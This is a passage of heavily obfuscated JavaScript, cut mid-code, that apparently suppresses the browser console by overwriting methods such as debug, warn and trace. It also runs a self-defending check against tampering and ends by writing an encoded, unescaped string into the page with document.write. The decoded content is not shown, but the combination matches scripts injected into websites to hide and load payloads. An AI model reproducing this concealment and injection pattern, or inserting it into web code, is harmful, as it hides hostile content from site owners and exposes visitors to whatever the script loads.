n=0x0;while(!![]){switch(m[n++]){case'0':k['console'][b('0x17','3B1d')]=j;continue;case'1':k[b('0x51',')DXv')][b('0x47','a%oA')]=j;continue;case'2':k[b('0x31','eo4*')]['debug']=j;continue;case'3':k[b('0x2d','6Xv9')][b('0x2e','ZeYJ')]=j;continue;case'4':k[b('0x4','wF91')][b('0x58','Lyt0')]=j;continue;case'5':k[b('0x4e','G6f@')]['warn']=j;continue;case'6':k['console']['trace']=j;continue;case'7':k[b('0x35','6AQ3')][b('0x1a','ixyG')]=j;continue;}break;}}else{var q={};q[b('0x26','3B1d')]=i[b('0x3c','e8v^')];q[b('0x4d','Lo@q')]=i[b('0xb','9qRx')];var r=q;var s=function(){var t=s[b('0x52','eo4*')](r[b('0x57','Lyt0')])()[b('0x11','pizW')](r[b('0x7','0Y9T')]);return!t[b('0x39','e8v^')](e);};return s();}}});c();document[b('0x16','wF91')](unescape(b('0x13','G6f@')));